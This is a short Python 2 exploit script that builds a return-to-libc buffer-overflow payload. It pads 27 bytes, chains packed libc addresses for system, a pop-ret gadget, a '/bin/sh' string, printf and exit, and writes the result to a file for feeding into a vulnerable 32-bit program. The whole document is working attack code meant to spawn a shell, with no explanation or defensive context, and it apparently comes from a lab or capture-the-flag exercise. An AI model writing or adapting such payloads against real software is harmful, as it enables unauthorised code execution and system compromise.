#!/usr/bin/python


import struct


libc_system = struct.pack("<I", 0xf7e06540)
libc_printf = struct.pack("<I", 0xf7e1a1c0)
libc_binsh = struct.pack("<I", 0xf7f424b1)
libc_exit = struct.pack("<I", 0xf7df9590)
libc_ffff = struct.pack("<I", 0xffffffff)

libc_pop_ret = struct.pack("<I", 0xf7ded9be)

buffer = "A" * 27
buffer += libc_system
buffer += libc_pop_ret
buffer += libc_binsh

buffer += libc_printf
buffer += libc_pop_ret
buffer += libc_binsh


buffer += libc_exit
buffer += libc_pop_ret
buffer += libc_ffff



fp = open("1.txt", "w")
fp.write(buffer)
fp.close()
print "Done!"
